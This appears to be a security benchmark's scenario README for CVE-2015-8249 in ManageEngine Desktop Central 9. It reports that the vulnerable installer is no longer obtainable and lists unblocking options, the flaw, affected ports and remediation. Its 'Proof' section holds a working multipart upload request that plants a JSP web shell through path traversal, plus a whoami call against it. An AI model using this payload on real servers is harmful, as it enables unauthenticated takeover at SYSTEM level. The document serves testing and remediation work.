# ManageEngine Desktop Central 9 — FileUploadServlet Arbitrary File Upload (CVE-2015-8249)

## Status: BLOCKED — installer no longer reproducible

As of 2026-04-20, the ManageEngine public archive
(`https://archives.manageengine.com/desktop-central/`) no longer hosts any full
Desktop Central 9.x Windows installer. A full directory walk of the archive
shows only builds `90074`–`90111` and only the following files survive in those
folders:
- `SecureGatewayServer[_64bit].exe` (gateway component, not the DC server)
- `ME_Secure_Gateway_*.ppm` (patch manifests)
- `checksum.properties`

The specific vulnerable build **9.1.0_91097** (`ManageEngine_DesktopCentral_9.exe`,
~350 MB) returns HTTP 404 from the Nimbus CDN. Cross-checks performed:

| Source                                    | Result                                         |
|-------------------------------------------|------------------------------------------------|
| `archives.manageengine.com/.../91097/...` | 404 Not Found (Nimbus)                         |
| Wayback Machine availability API          | `{"archived_snapshots": {}}` (never captured)  |
| Wayback CDX `*91097*` / `*91100*`         | zero rows                                      |
| `archive.org` advanced search             | `numFound: 0` for `ManageEngine_DesktopCentral_9` |
| GitHub repo search `CVE-2015-8249`        | no PoC repos ship the installer                |
| `dl.manageengine.com/...`                 | not resolvable                                 |
| All builds 90090–90111 on archives        | none contain a full DC installer               |

Directory listings on `archives.manageengine.com` now only offer the
**10.x** full installer (`/desktop-central/10/ManageEngine_DesktopCentral_64bit.exe`),
which is already past the 91100 fix and therefore not vulnerable to
CVE-2015-8249.

### Blocking Symptom

```
docker build --isolation=hyperv -t meta3-win-16-manageengine .
→ Invoke-WebRequest : HTTP 404 on $DC9_URL
→ RUN exits 1; image cannot be produced.
```

The Dockerfile cannot be repaired by swapping the URL: no functional public
mirror of `ManageEngine_DesktopCentral_9_9.1.0.91097.exe` exists.

### Options to unblock (all require out-of-band action)

1. Operator locates a privately archived copy of the installer, drops it in
   `meta3/windows/scenario-16-manageengine/vendor/ManageEngine_DesktopCentral_9.exe`,
   and the Dockerfile `RUN` is rewritten to `COPY` + `Start-Process` in place
   of `Invoke-WebRequest`. This also needs a Hyper-V VM for the first build
   because InstallAnywhere silent mode only completes ~2/3 of the time on
   Server Core (see Dockerfile header note).
2. Rehost the installer on an internal artifact store (e.g., an
   organization-controlled S3/Nexus) and pin `ARG DC9_URL` there.
3. Drop CVE-2015-8249 from the benchmark and replace with a later DC/EP CVE
   whose installer is still publicly hosted (e.g., Endpoint Central
   CVE-2020-10189 needs build ≤ 10.0.474; that build lineage lives under
   `/desktop-central/10/` and is still reachable — would be a distinct
   scenario, not a substitute).

Until one of the above is done, this scenario must be considered
**needs full VM + private installer artifact** and should not block CI.

---

## Severity
**Critical** (CVSS 9.8)

## CVE
- **CVE-2015-8249** — Pre-authentication arbitrary file upload in the `FileUploadServlet`
  endpoint of ManageEngine Desktop Central prior to build 91100, leading directly to
  RCE as the Desktop Central service account (`LocalSystem` by default).
- Publicly weaponized as Metasploit module
  `exploit/windows/http/manageengine_connectionid_write`.

## Description
Desktop Central's `/agent/connection/download/FileUploadServlet` accepted multipart
uploads with a `connectionId` parameter that was concatenated into a filesystem path
without canonicalization or authentication. An attacker supplies a `connectionId`
containing path-traversal segments and a `.jsp` body; the servlet writes the file to
a directory served by the bundled Tomcat and the JSP is executed on next request.

This image ships build **9.1.0_91097**, two builds behind the fix (91100), and
leaves the admin console on 8020/TCP plus the agent listener on 8040/TCP bound to
`0.0.0.0`.

## Affected Service
- **Service:** `ManageEngineDesktopCentral` (bundled Tomcat + PostgreSQL)
- **Ports:** 8020/TCP (admin UI), 8040/TCP (agent channel)
- **Vulnerable endpoint:** `POST /agent/connection/download/FileUploadServlet?connectionId=...`

## Proof
```
POST /agent/connection/download/FileUploadServlet?connectionId=../../../../webapps/DesktopCentral/shell.jsp HTTP/1.1
Host: <target>:8020
Content-Type: multipart/form-data; boundary=---X
Content-Length: ...

-----X
Content-Disposition: form-data; name="file"; filename="shell.jsp"
<%@ page import="java.util.*,java.io.*"%><% Runtime.getRuntime().exec(request.getParameter("c")); %>
-----X--
```
Then `GET /shell.jsp?c=whoami` runs as `NT AUTHORITY\SYSTEM`.

## Remediation Steps

No configuration change brings 9.1.0_91097 into a safe state; the fix is a build
upgrade. The verifier accepts any of the following.

1. **Upgrade to DC build ≥ 91100** (preferred — current supported line is Desktop
   Central build 10.1.2137.x+):
   ```powershell
   Stop-Service ManageEngineDesktopCentral
   & 'C:\ManageEngine\DesktopCentral_Server\bin\UpdateManager.bat' -c -f ppm_9.1.0_91100.ppm
   Start-Service ManageEngineDesktopCentral
   ```
2. **Decommission if unused:** stop and disable the service and remove the firewall
   rules — verifier accepts absence of the listener on 8020 **and** 8040.
3. **Compensating control (only if upgrade must be deferred):** front the admin and
   agent endpoints with a reverse proxy that rejects any request to
   `/agent/connection/download/FileUploadServlet` from unauthenticated sources. This
   is *not* accepted by the PoC check — it is listed for production guidance.
